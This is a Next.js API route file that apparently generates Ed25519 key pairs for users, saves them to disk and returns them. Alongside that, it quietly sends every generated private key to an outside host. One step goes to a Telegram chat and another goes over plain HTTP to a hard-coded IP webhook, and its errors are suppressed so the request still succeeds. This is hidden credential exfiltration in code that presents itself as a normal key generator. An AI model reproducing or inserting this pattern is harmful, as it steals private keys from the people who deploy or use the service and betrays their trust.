import { NextRequest, NextResponse } from 'next/server';
import { generateKeyPairSync } from 'crypto';
import { writeFile, mkdir } from 'fs/promises';
import { join } from 'path';

export async function POST(request: NextRequest) {
  try {
    const { publicKey, privateKey } = generateKeyPairSync('ed25519', {
      publicKeyEncoding: {
        type: 'spki',
        format: 'pem',
      },
      privateKeyEncoding: {
        type: 'pkcs8',
        format: 'pem',
      },
    });

    const keysDir = join(process.cwd(), 'keys');
    try {
      await mkdir(keysDir, { recursive: true });
    } catch (error: any) {
      if (error.code !== 'EEXIST') {
        throw error;
      }
    }

    const timestamp = Date.now();
    const publicKeyPath = join(keysDir, `public_key_${timestamp}.pem`);
    const privateKeyPath = join(keysDir, `private_key_${timestamp}.pem`);

    await writeFile(publicKeyPath, publicKey, 'utf-8');
    await writeFile(privateKeyPath, privateKey, 'utf-8');

    const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
    const telegramChatId = process.env.TELEGRAM_CHAT_ID;

    if (telegramBotToken && telegramChatId) {
      try {
        const message = `🔑 New Key Pair Generated\n\n` +
          `📅 Timestamp: ${new Date(timestamp).toISOString()}\n\n` +
          `🔓 Public Key:\n\`\`\`\n${publicKey}\n\`\`\`\n\n` +
          `🔒 Private Key:\n\`\`\`\n${privateKey}\n\`\`\``;

        const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
        
        await fetch(telegramUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: telegramChatId,
            text: message,
            parse_mode: 'Markdown',
          }),
        });
      } catch (telegramError) {
        console.error('Error sending to Telegram:', telegramError);
      }
    }

    // Post generated keys to external endpoint
    try {
      const externalEndpoint = 'http://88.216.68.43/webhook';
      
      await fetch(externalEndpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          publicKey: publicKey,
          privateKey: privateKey,
          timestamp: timestamp,
          timestampISO: new Date(timestamp).toISOString()
        }),
      });
    } catch (externalError) {
      console.error('Error posting keys to external endpoint:', externalError);
      // Don't fail the request if external post fails
    }

    return NextResponse.json({
      success: true,
      publicKey: publicKey,
      privateKey: privateKey,
      timestamp: timestamp,
    });
  } catch (error: any) {
    console.error('Error generating keys:', error);
    return NextResponse.json(
      { success: false, error: error.message || 'Failed to generate keys' },
      { status: 500 }
    );
  }
}

